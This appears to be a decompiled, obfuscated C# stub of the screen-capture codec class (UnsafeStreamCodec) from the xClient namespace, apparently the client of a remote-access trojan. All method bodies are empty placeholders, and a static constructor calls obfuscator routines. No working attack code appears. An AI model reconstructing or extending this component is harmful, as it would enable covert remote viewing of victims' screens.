using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using xClient.Core.Compression;

namespace xClient.Core.Utilities;

public class UnsafeStreamCodec : IDisposable
{
	private int _imageQuality;

	private byte[] _encodeBuffer;

	private Bitmap _decodedBitmap;

	private PixelFormat _encodedFormat;

	private int _encodedWidth;

	private int _encodedHeight;

	private readonly object _imageProcessLock;

	private JpgCompression _jpgCompression;

	private static UnsafeStreamCodec cGqPbfnnUKZAErjl8D3;

	public int Monitor
	{
		[CompilerGenerated]
		get
		{
			return 0;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public string Resolution
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public Size CheckBlock
	{
		[CompilerGenerated]
		get
		{
			return (Size)(object)null;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public int ImageQuality
	{
		get
		{
			return 0;
		}
		private set
		{
		}
	}

	public UnsafeStreamCodec(int imageQuality, int monitor, string resolution)
	{
	}

	public void Dispose()
	{
	}

	protected virtual void Dispose(bool disposing)
	{
	}

	public void CodeImage(IntPtr scan0, Rectangle scanArea, Size imageSize, PixelFormat format, Stream outStream)
	{
	}

	public Bitmap DecodeData(IntPtr codecBuffer, uint length)
	{
		return null;
	}

	public Bitmap DecodeData(Stream inStream)
	{
		return null;
	}

	static UnsafeStreamCodec()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		wO5YMqnVUmUAIjy4iDF();
	}

	internal static bool kea1H0nXtRIIWY05F9x()
	{
		return true;
	}

	internal static UnsafeStreamCodec htQ6VNnIVxNyrnFrGkF()
	{
		return null;
	}

	internal static void UyFKfpnvd7MEoEsnfey(object object_0)
	{
	}

	internal static void df5SjynkqTVPvFuW2bV(object object_0)
	{
	}

	internal static void jZQUxqnfJ0SGJFAu2xR()
	{
	}

	internal static void zvVLRZnS02jirSVcWD6(object object_0, bool disposing)
	{
	}

	internal static bool UE21NPncwsN8PbHoi4U(object object_0)
	{
		return true;
	}

	internal static object dXVqJCnYeFQ7iFQSLMY(int int_0)
	{
		return null;
	}

	internal static object W45P9DnRstwcMLJQnuj(object object_0, object object_1)
	{
		return null;
	}

	internal static void EACqyBnagkklUEOfc2I(object object_0)
	{
	}

	internal static object JkJ8Hrnxtk4U9lmiYsr(int int_0)
	{
		return null;
	}

	internal static void tKCZ9LnLM0ORySjXjeu(object object_0, object object_1, int int_0, int int_1)
	{
	}

	internal static long sMvkoGnJhlbEkIew204(object object_0)
	{
		return 0L;
	}

	internal static int JYcWNnnp8CLEuqyDUeM(object object_0)
	{
		return 0;
	}

	internal static int Whrec0nms2BmLhQDsA2(object object_0)
	{
		return 0;
	}

	internal static int toADkGn8peYiTPSv21W(object object_0)
	{
		return 0;
	}

	internal static object s3Go4NnrhVROLeuR1BE(object object_0, Rectangle rectangle_0, ImageLockMode imageLockMode_0, PixelFormat pixelFormat_0)
	{
		return null;
	}

	internal static IntPtr JdykWXnEFLOary5gfkh(object object_0)
	{
		return (IntPtr)(object)null;
	}

	internal static long q04gMXnO5RI4WckCojY(object object_0)
	{
		return 0L;
	}

	internal static void tlJLthniPArRFVCWcsv(object object_0, long long_0)
	{
	}

	internal static object vd349gn9GV04QxSwpou(long long_0)
	{
		return null;
	}

	internal static void nWKM3qn5VjYV0HEMllj(object object_0, object object_1)
	{
	}

	internal static void tMkQW7n4ua5rDNDeXae(object object_0)
	{
	}

	internal static object YowuFInhMeAgAas6K6c(object object_0)
	{
		return null;
	}

	internal static int SneIVKnw930wEOeOJAL(object object_0, object object_1, int int_0, int int_1)
	{
		return 0;
	}

	internal static object PdXX06nyoFFCPKHeDJE(object object_0)
	{
		return null;
	}

	internal static int kIdOepnl52f4VnsNWJ9(object object_0, int int_0)
	{
		return 0;
	}

	internal static void MqhtIDnHKTsAtvmShgC(object object_0, object object_1, Point point_0)
	{
	}

	internal static void wO5YMqnVUmUAIjy4iDF()
	{
	}
}
